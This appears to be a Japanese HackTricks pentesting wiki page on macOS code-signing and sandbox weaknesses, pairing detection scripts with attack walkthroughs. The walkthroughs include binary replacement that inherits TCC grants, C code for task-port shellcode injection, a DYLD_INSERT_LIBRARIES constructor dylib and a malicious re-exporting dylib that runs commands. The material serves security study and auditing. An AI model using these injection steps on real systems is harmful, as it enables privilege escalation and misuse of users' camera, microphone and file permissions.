# macOS コード署名の弱点とサンドボックス脱出

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### 基本情報

**Ad-hoc signing** (`CS_ADHOC`) は **証明書チェーンがない** コード署名を作成します — 開発者の身元検証がないコードのハッシュです。バイナリの出所は特定の開発者や組織に辿れません。

Apple Silicon 搭載の Mac では、すべての実行可能ファイルに最低でも ad-hoc 署名が必要です。つまり、多くの開発ツール、Homebrew パッケージ、サードパーティ製ユーティリティに ad-hoc 署名が存在します。

### なぜ重要か

- **検証可能な識別情報がない** — バイナリは識別情報に基づくチェックで検出されずに置き換えられる可能性がある
- 第三者の ad-hoc バイナリが **特権的な位置**（FDA、daemon、helpers）にある場合は優先的に狙われる
- 一部の構成では、ad-hoc 署名は開発者署名されたコードほど厳密に検証されないことがある
- **TCC grants** を持つ ad-hoc 署名バイナリは特に価値が高い — バイナリの内容が変更されても権限付与が維持される（TCC がどのように grant をキー付けしたかに依存）

### 検出
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### 攻撃: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## デバッグ可能なプロセス (get-task-allow)

### 基本情報

The **`com.apple.security.get-task-allow`** エンタイトルメント（または `CS_GET_TASK_ALLOW` フラグ）は、**任意のプロセスが debugger としてアタッチできる**ようにし、メモリの読み取り、レジスタの変更、コード注入、実行の制御を可能にします。

これは **開発ビルドのみ** を想定しています。とはいえ、一部のサードパーティ製バイナリは本番でこのエンタイトルメントを含んで出荷されます。

> [!CAUTION]
> `get-task-allow` を含む本番バイナリは**instant exploitation primitive**です。任意のローカルプロセスは `task_for_pid()` を呼び出して対象の Mach task port を取得し、対象の entitlements、TCC grants、security context で実行される任意のコードを注入できます。

### 検出
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attack: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## ライブラリ検証なし + DYLD 環境

### 危険な組み合わせ

バイナリが **両方** を持つ場合:
- `com.apple.security.cs.disable-library-validation` (任意の dylib を読み込む)
- `com.apple.security.cs.allow-dyld-environment-variables` (DYLD の環境変数を受け入れる)

これは **確実なコード注入プリミティブ** — `DYLD_INSERT_LIBRARIES` は完全に機能します。

### 検出
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### 攻撃: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## サンドボックスの一時的例外

### それらがサンドボックスを弱める方法

サンドボックスの一時的例外 (`com.apple.security.temporary-exception.*`) は App Sandbox に穴を開けます:

| 例外 | 許可されること |
|---|---|
| `temporary-exception.mach-lookup.global-name` | システム全体の XPC/Mach サービスに接続する |
| `temporary-exception.files.absolute-path.read-write` | アプリコンテナ外のファイルを読み書きする |
| `temporary-exception.iokit-user-client-class` | IOKit の user-client 接続を開く |
| `temporary-exception.shared-preference.read-only` | 他のアプリの設定を読み取る |
| `temporary-exception.files.home-relative-path.read-write` | `~` を基準としたパスにアクセスする |

### Mach-Lookup Exceptions = サンドボックス脱出のプリミティブ

最も危険な例外は **mach-lookup** — これによりサンドボックス化されたアプリが特権を持つデーモンと通信できます:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### 攻撃: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## プライベート Apple エンタイトルメント

### 概要

`com.apple.private.*` で始まるエンタイトルメントは、サードパーティ開発者に公開されていない、または文書化されていない **Apple内部のAPI** へのアクセスを提供します。プライベートエンタイトルメントを持つサードパーティ製バイナリは、enterprise cert、MDM、または非App-Store配布を通じてそれらを取得しています。

### 危険なプライベートエンタイトルメント

| エンタイトルメント | 機能 |
|---|---|
| `com.apple.private.tcc.manager` | TCCデータベースへの完全な読み書き |
| `com.apple.private.tcc.allow` | 特定のTCCサービスへのアクセス |
| `com.apple.private.security.no-sandbox` | サンドボックスなしで実行 |
| `com.apple.private.iokit` | IOKitドライバへの直接アクセス |
| `com.apple.private.kernel.*` | カーネルインターフェースへのアクセス |
| `com.apple.private.xpc.launchd.job-label` | launchdジョブの登録/管理 |
| `com.apple.rootless.install` | SIPで保護されたパスへの書き込み |

### 検出
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## カスタムサンドボックスプロファイル (SBPL)

### 概要

バイナリは SBPL (Seatbelt Profile Language) で書かれた **カスタムサンドボックスプロファイル** を同梱して配布されることがある。これらのプロファイルは、デフォルトの App Sandbox よりも制限が厳しい場合もあれば、**より許可的** な場合もある。

### カスタムプロファイルの監査
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## 書き込み可能なライブラリパス

### 概要

バイナリが現在のユーザーが**書き込み可能な**パスから動的ライブラリを読み込む場合、そのライブラリは悪意のあるコードに置き換えられる可能性があります。

### 検出
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### 攻撃: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

* [Apple Developer — コード署名ガイド](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox（アプリサンドボックス）](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements（エンタイトルメント）](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library.validation/)

{{#include ../../../banners/hacktricks-training.md}}
